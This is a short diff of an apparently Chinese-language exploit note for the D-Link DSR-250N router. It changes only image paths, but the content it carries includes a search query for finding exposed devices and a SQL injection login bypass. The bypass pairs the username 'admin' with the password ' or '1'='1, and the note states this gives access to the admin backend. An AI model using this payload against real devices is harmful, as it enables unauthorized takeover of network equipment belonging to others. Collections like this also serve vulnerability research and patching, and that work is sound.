@@ -20,13 +20,13 @@ app="D_Link-DSR-250N"
 
 登录页面如下
 
-![](images/202202162222919.png)
+![](../.gitbook/assets/202202162222919.png)
 
-```plain
+```
 user: admin
 pass: ' or '1'='1
 ```
 
 成功登录后台
 
-![](images/202202162223338.png)
+![](../.gitbook/assets/202202162223338.png)
